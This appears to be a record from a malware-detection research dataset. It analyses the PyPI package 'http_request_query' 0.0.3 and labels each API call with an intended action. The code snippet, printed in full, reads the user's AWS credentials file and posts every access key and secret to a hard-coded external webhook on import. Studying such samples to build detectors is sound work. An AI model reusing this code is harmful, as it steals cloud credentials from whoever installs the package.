{
  "metadata": {
    "package_name": "http_request_query-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/http_request_query-0.0.3.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "http_query.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/http_request_query-0.0.3/http_request_query-0.0.3/http_query/http_query.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport configparser\nimport requests\n\ndef push_secrets(web_hook):\n    config = configparser.RawConfigParser()\n    path = os.path.join(os.path.expanduser('~'), '.aws/credentials')\n    config.read(path)\n    \n    sections = config.sections()\n    all_secrets = []\n    for section in sections:\n        data_dict = {}\n        data_dict['section'] = section\n        data_dict['aws_access_key_id'] = config.get(section, 'aws_access_key_id')\n        data_dict['aws_secret_access_key'] = config.get(section, 'aws_secret_access_key')\n        all_secrets.append(data_dict)\n    headers = {'content-type': 'application/json'}\n    try:\n        requests.post(web_hook, json=all_secrets, headers=headers)\n    except requests.RequestException as e:\n        pass\n\nweb_hook = \"https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjUwNTY4MDYzMzA0MzQ1MjZiNTUzNzUxMzUi_pc\"\npush_secrets(web_hook)",
          "triple_sequences": [
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "~",
              "object_description": "Home directory path",
              "object_id": "home_directory_path",
              "intention_description": "Access user home directory",
              "intention_id": "access_user_home_directory"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.path.expanduser('~'), '.aws/credentials'",
              "object_description": "Directory path with file",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "configparser.RawConfigParser()",
              "action_description": "Instantiates RawConfigParser class",
              "action_id": "import_dynamic",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access configuration value",
              "intention_id": "access_configuration_value"
            },
            {
              "action_api": "config.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "os.path.join(os.path.expanduser('~'), '.aws/credentials')",
              "object_description": "System credential file",
              "object_id": "system_credential_file",
              "intention_description": "Access system credential file",
              "intention_id": "access_system_credential_file"
            },
            {
              "action_api": "config.sections()",
              "action_description": "Retrieves sections from configuration file",
              "action_id": "import_dynamic",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access configuration value",
              "intention_id": "access_configuration_value"
            },
            {
              "action_api": "config.get()",
              "action_description": "Retrieves value from configuration file",
              "action_id": "import_dynamic",
              "object": "section, 'aws_access_key_id'",
              "object_description": "API key",
              "object_id": "api_key",
              "intention_description": "Access configuration value",
              "intention_id": "access_configuration_value"
            },
            {
              "action_api": "config.get()",
              "action_description": "Retrieves value from configuration file",
              "action_id": "import_dynamic",
              "object": "section, 'aws_secret_access_key'",
              "object_description": "API key",
              "object_id": "api_key",
              "intention_description": "Access configuration value",
              "intention_id": "access_configuration_value"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "web_hook, json=all_secrets, headers={'content-type': 'application/json'}",
              "object_description": "Webhook endpoint",
              "object_id": "webhook_endpoint",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            }
          ]
        }
      ]
    }
  ]
}